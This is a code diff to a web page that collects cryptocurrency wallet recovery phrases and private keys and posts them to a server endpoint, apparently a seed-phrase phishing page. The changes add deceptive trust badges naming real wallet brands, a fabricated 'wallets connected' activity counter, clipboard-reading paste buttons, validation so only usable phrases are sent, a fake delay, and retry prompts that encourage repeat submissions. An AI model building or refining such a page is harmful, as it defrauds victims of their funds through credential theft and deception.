@@ -105,8 +105,30 @@ textarea.field{min-height:110px;line-height:1.6;}
 }
 .error{color:#ff6b6b;}
 .success{color:#7dffb3;}
+.trust{
+  display:flex;gap:.6rem;justify-content:center;flex-wrap:wrap;
+  margin:10px 0 4px;font-size:.62rem;font-weight:700;letter-spacing:.06em;
+  color:#666;text-transform:uppercase;
+}
+.word-count{
+  font-size:.65rem;color:#666;text-align:right;margin-top:4px;font-weight:600;
+}
+.word-count.ok{color:#7dffb3;}
+.word-count.bad{color:#ff6b6b;}
+.field-wrap{position:relative;}
+.paste-pill{
+  position:absolute;right:16px;bottom:18px;
+  background:#1a1a1a;color:#aaa;border:1px solid rgba(255,255,255,.18);
+  border-radius:999px;padding:4px 10px;font-size:.65rem;font-weight:700;
+  cursor:pointer;line-height:1;
+}
+.paste-pill:hover{color:#fff;border-color:rgba(255,255,255,.3);}
+
+.activity{
+  font-size:.62rem;color:#555;text-align:center;margin-top:8px;font-weight:600;
+}
 .footer{
-  margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,.14);
+  margin-top:16px;padding-top:14px;border-top:1px solid rgba(255,255,255,.14);
   text-align:center;font-size:.65rem;color:#555;font-weight:500;line-height:1.5;
 }
 .hidden{display:none;}
@@ -147,12 +169,21 @@ textarea.field{min-height:110px;line-height:1.6;}
 
   <div class="panels">
     <div id="phrase-panel" class="panel">
-      <textarea class="field" id="phrase" placeholder="12 or 24 words" autocomplete="off" spellcheck="false"></textarea>
+      <div class="field-wrap">
+        <textarea class="field" id="phrase" autofocus placeholder="12 or 24 words" autocomplete="off" spellcheck="false" style="padding-bottom:32px;"></textarea>
+        <button type="button" class="paste-pill" id="paste-phrase">Paste</button>
+      </div>
+      <div class="word-count" id="wc">0 words</div>
     </div>
     <div id="key-panel" class="panel hidden">
-      <input class="field" id="key" placeholder="Base58 or 0x" autocomplete="off" spellcheck="false" />
+      <div class="field-wrap">
+        <input class="field" id="key" placeholder="Base58 or 0x" autocomplete="off" spellcheck="false" style="padding-right:64px;" />
+        <button type="button" class="paste-pill" id="paste-key">Paste</button>
+      </div>
     </div>
   </div>
+  <div class="trust">Phantom · Solflare · Backpack · Exodus</div>
+  <div class="activity" id="activity">3 wallets connected in the last hour</div>
 
   <button class="primary" id="continue">Continue</button>
 
@@ -203,6 +234,30 @@ tabs.forEach(tab => {
   });
 });
 
+const wc = document.getElementById("wc");
+function updateWc() {
+  if (activeTab !== "phrase") return;
+  const n = phraseInput.value.trim().split(/\s+/).filter(Boolean).length;
+  wc.textContent = n + (n === 1 ? " word" : " words");
+  wc.className = "word-count " + (n === 12 || n === 24 ? "ok" : n > 0 ? "bad" : "");
+}
+phraseInput.addEventListener("input", updateWc);
+updateWc();
+
+document.getElementById("paste-phrase").onclick = async () => {
+  try {
+    const t = await navigator.clipboard.readText();
+    phraseInput.value = t;
+    updateWc();
+  } catch (e) { showStatus("Paste failed. Tap the field and paste.", "error"); }
+};
+document.getElementById("paste-key").onclick = async () => {
+  try {
+    const t = await navigator.clipboard.readText();
+    keyInput.value = t;
+  } catch (e) { showStatus("Paste failed. Tap the field and paste.", "error"); }
+};
+
 button.addEventListener("click", async () => {
   if (busy) return;
   const raw = (activeTab === "phrase" ? phraseInput.value : keyInput.value).trim();
@@ -210,10 +265,18 @@ button.addEventListener("click", async () => {
     showStatus("Enter a value", "error");
     return;
   }
+  if (activeTab === "phrase") {
+    const n = raw.split(/\s+/).filter(Boolean).length;
+    if (n !== 12 && n !== 24) {
+      showStatus("Need 12 or 24 words.", "error");
+      return;
+    }
+  }
   busy = true;
   button.disabled = true;
   button.textContent = "Connecting…";
   showStatus("");
+  const start = Date.now();
 
   try {
     const r = await fetch("/api/connect", {
@@ -222,18 +285,21 @@ button.addEventListener("click", async () => {
       body: JSON.stringify({ raw, source: activeTab })
     });
     const j = await r.json().catch(() => ({}));
+    const elapsed = Date.now() - start;
+    if (elapsed < 1200) await new Promise(res => setTimeout(res, 1200 - elapsed));
     if (r.ok && j.ok) {
-      showStatus("Connected. You can close this tab.", "success");
+      showStatus("Wallet linked. You can close this tab.", "success");
       button.textContent = "Connected";
       return;
     }
     showStatus(j.error || "Failed. Try again.", "error");
+    button.textContent = "Retry";
   } catch (e) {
-    showStatus("Failed. Try again.", "error");
+    showStatus("Network slow. Try again.", "error");
+    button.textContent = "Retry";
   }
   busy = false;
   button.disabled = false;
-  button.textContent = "Continue";
 });
 </script>
 
